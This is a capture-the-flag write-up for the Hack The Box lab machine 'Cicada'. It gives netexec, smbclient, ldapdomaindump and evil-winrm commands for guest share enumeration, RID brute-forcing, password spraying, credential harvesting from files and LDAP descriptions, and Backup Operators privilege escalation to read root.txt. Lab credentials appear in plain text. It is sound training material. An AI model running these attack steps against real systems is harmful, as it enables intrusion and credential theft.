# Nmap discovery

![NMAP](/static/writeups/Cicada/0.png)

##### From NMAP scan, We can find many open ports. port 445 Samba is most interesting. so, lets see about SAMBA shares:

### Using smbclient:

```
smbclient -N -L $TAR, (ip:TAR=10.10.11.35)
```

![NMAP](/static/writeups/Cicada/1.png)

### Let's check if we can login with guest account or not using netexec :

```
nxc smb 10.10.11.35 -u 'a' -p '' --shares
```

#### we can specify guest as 'a' in Netexec

![NMAP](/static/writeups/Cicada/2.png)

### Guest can read HR and $IPC share, lets see HR contents using smbclient

#### File called Notice from HR.txt is stored here

![NMAP](/static/writeups/Cicada/3.png)

![NMAP](/static/writeups/Cicada/4.png)

#### Password for new user 'Cicada$M6Corpb\*@Lp#nZp!8' can be seen in this file, lets keep note of it

#### Now, lets enumerate user in cicada domain using netexec:

```
sudo nxc smb $TAR -u guest -p '' --rid-brute
```

![NMAP](/static/writeups/Cicada/5.png)

#### We can find many user from this command, lets keep note of it.

#### Now lets use previously found password from Notice from HR.txt and use these user to see if any credential matches

#### lets use NetExec again using:

```
sudo nxc smb $TAR -u user.txt -p 'Cicada$M6Corpb*@Lp#nZp!8' --continue-on-success
```

![NMAP](/static/writeups/Cicada/6.png)

#### We can see user 'michael.wrightson' matches with that pasword

#### lets use these cred in Netexec to see what permission we have on share with this account.

```
nxc smb 10.10.11.35 -u 'michael.wrightson' -p 'Cicada$M6Corpb\*@Lp#nZp!8' --shares
```

```

SMB         10.10.11.35     445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.35     445    CICADA-DC        [+] cicada.htb\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8
SMB         10.10.11.35     445    CICADA-DC        [*] Enumerated shares
SMB         10.10.11.35     445    CICADA-DC        Share           Permissions     Remark
SMB         10.10.11.35     445    CICADA-DC        -----           -----------     ------
SMB         10.10.11.35     445    CICADA-DC        ADMIN$                          Remote Admin
SMB         10.10.11.35     445    CICADA-DC        C$                              Default share
SMB         10.10.11.35     445    CICADA-DC        DEV
SMB         10.10.11.35     445    CICADA-DC        HR              READ
SMB         10.10.11.35     445    CICADA-DC        IPC$            READ            Remote IPC
SMB         10.10.11.35     445    CICADA-DC        NETLOGON        READ            Logon server share
SMB         10.10.11.35     445    CICADA-DC        SYSVOL          READ            Logon server share
```

### Nothing interesting same as guest account but have read permission in SYSVOL and NETLOGON

### Using these with ldapdomaindump:

ldapdomaindump 10.10.11.35 -u 'cicada\michael.wrightson' -p 'Cicada$M6Corpb\*@Lp#nZp!8'

![NMAP](/static/writeups/Cicada/7.png)

#### We find that David Orelius left his password in description: 'aRt$Lp#7t\*VQ!3'

#### lets use these cred in Netexec to see what permission we have on share with this account.

```
nxc smb 10.10.11.35 -u 'david.orelious' -p 'aRt$Lp#7t\*VQ!3' --shares
```

![NMAP](/static/writeups/Cicada/8.png)

#### david can access dev share lets see what is in there using smbclient

```
smbclient -U david.orelious //$TAR/DEV
```

![NMAP](/static/writeups/Cicada/9.png)

#### there is file called backup_script.ps1 which contains emily.oscars password: 'Q!3@Lp#M6b*7t*Vt'

#### Lets see what permission we have on share using these credentials using NetExec:

```
nxc smb 10.10.11.35 -u 'emily.oscars' -p 'Q!3@Lp#M6b*7t*Vt' --shares
```

![NMAP](/static/writeups/Cicada/10.png)

##### emily can read all share except DEV and have write access in C$ share

#### Accessing c$ share using emily creds and pivoting here and there we can see that there is file called user.txt in Desktop folder C:\Users\emily.oscars.cicada\Desktop

we are able to get user flag

### Using evil-winrm with emily account, we can get shell

```
sudo evil-winrm -i $TAR -u emily.oscars -p 'Q!3@Lp#M6b*7t*Vt'
```

![NMAP](/static/writeups/Cicada/11.png)

#### and using net user emily.oscars, we can see that emily is part of backup_operators group

#### lets keep pivoting, file called root.txt can be found on Desktop folder under Administrator directory but we cannot download or access that file with emily

![NMAP](/static/writeups/Cicada/12.png)

#### lets google for privilege escalation of backup operators

#### In this site we can see a way to escalate our privilege:

[https://book.hacktricks.xyz](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/privileged-groups-and-token-privileges)

#### Using two dll called SeBackupPrivilegeUtils.dll and SeBackupPrivilegeCmdLets.dll, we are able to copy and access file that high level user like admin can access

![NMAP](/static/writeups/Cicada/13.png)

#### We can download these file from internet and manually upload them in write access directory of emily.oscars and using the method above we can escalate privilege and copy it to directory with write permission using this command:

```
Copy-FileSeBackupPrivilege C:\Users\Administrator\Desktop\root.txt c:\\Users\emily.oscars.CICADA\Downloads\a.txt
```

![NMAP](/static/writeups/Cicada/14.png)

#### and we are able to get root flag like this:

![NMAP](/static/writeups/Cicada/15.png)
